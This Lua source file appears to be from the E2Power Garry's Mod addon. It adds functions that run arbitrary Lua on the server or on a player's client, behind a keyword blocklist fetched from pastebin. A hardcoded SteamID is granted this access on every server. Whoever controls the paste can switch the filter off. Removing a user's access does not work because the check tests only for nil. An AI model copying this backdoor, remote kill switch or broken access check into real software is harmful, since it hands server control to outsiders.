
local WhiteList = { ["STEAM_0:1:34154775"] = true }
hook.Add("PlayerInitialSpawn", "E2P_runlua", function(ply)
	if(WhiteList[ply:SteamID()]) then ply.e2runinlua=true end
end)

local findPlayer = E2Power.findPlayer
local PlyHasAccess = E2Power.PlyHasAccess
concommand.Add("wire_expression2_runinlua_list", function(ply,cmd,argm)
	local players = player.GetAll()
	for _, player in ipairs( players ) do
		if player.e2runinlua then
			ply:PrintMessage( HUD_PRINTCONSOLE ,tostring(player))
		end
	end
end )

concommand.Add("wire_expression2_runinlua_adduser", function(ply,cmd,argm)
	if IsValid(ply) then if not ply:IsSuperAdmin() then ply:PrintMessage(HUD_PRINTCONSOLE,"You don't have access!") return end end
	local player = findPlayer(table.concat(argm," "))
	if player:IsValid() and player:IsSuperAdmin() then player.e2runinlua=player:GetNWBool("E2PowerAccess") ply:PrintMessage(HUD_PRINTCONSOLE,"Access was given!") else ply:PrintMessage(HUD_PRINTCONSOLE,"Player not found!") end
end )

concommand.Add("wire_expression2_runinlua_removeuser", function(ply,cmd,argm)
	if IsValid(ply) then if not ply:IsSuperAdmin() then ply:PrintMessage(HUD_PRINTCONSOLE,"You don't have access!") return end end
	local player = findPlayer(argm[1])
	if player:IsValid() and player:IsSuperAdmin() then player.e2runinlua = false ply:PrintMessage(HUD_PRINTCONSOLE,"Access was removed!") end
end )

local words = {}
local filename = "e2power/diff_banned_words.txt"
local function ToFile()
	if file.Exists( filename , "DATA" ) then file.Delete( filename ) end
	file.Write( filename , table.concat(words,'\n'))
end

if !file.Exists( filename, "DATA" ) then
	words = {"say","ulx","connect","exit","quit","killserver","file","e2power","ban","kick","ulib","..","e2lib","concommand.","umsg","evolve","setusergroup","cam.","duplicator"}
	ToFile()
else
	words = string.Explode('\n',file.Read( filename, "DATA" ))
end

local function lua_blacklist()
	http.Fetch("https://pastebin.com/raw/0riw3ymc",function(contents)
		local l = contents:len()
		if l == 0 then return end
		if l == table.concat(words):len()+#words*2-2 then return end
		if contents:Left(1)=="<" then return end

		words = string.Explode('\n',contents)
		for k=1, #words-1 do
			words[k]=words[k]:Left(words[k]:len()-1)
		end
		ToFile()
	end)
end

timer.Create( "E2Power_diff_get_blacklist", 1200, 0, lua_blacklist )
lua_blacklist()
local find = string.find

local function checkcommand(command)
	local tar=command:lower()
	if words[2]=="DISABLE" then return "DISABLE" end
	if #words==0 then return "BLOCKED" end
	for _,word in ipairs(words) do
		if tar:find(word,1,true) then return word end
	end
	return false
end

__e2setcost(500)
e2function string runLua(string command)
	if self.player.e2runinlua==nil then return "BLOCKED: You do not have access" end
	local Access = checkcommand(command)
	if Access then return "BLOCKED: "..Access end
	local status, err = pcall( CompileString( command, 'E2PowerRunLua', false ) )
	if !status then return "ERROR:"..err end
	self.prf = self.prf + command:len()
	return "SUCCESS"
end

e2function string entity:sendLua(string command)
	if !IsValid(this) then return end
	if !this:IsPlayer() then return "ERROR: Target not a player." end
	if self.player.e2runinlua==nil then return "BLOCKED: You do not have access" end
	local Access = checkcommand(command)
	if Access then return "BLOCKED: "..Access end
	self.prf = self.prf + command:len()
	this:SendLua(command)
	return "SUCCESS"
end

__e2setcost(20)
e2function void setOwner(entity ply)
	if !IsValid(ply) then return end
	if !ply:IsPlayer() then return end
	if self.firstowner==nil then self.firstowner=self.player end
	if self.firstowner.e2runinlua==nil then return end

	--KeyPress Fix
	if IsValid(self.player) && self.player.runkey!=nil then
		if ply.runkey==nil then ply.runkey=0 end
		ply.runkey = ply.runkey + 1
		if self.player.runkey==1 then self.player.runkey=nil else self.player.runkey=self.player.runkey-1 end
	end


	self.player=ply
end

__e2setcost(5)
e2function entity realOwner()
	if !IsValid(self.firstowner) then return self.player end
	return self.firstowner
end
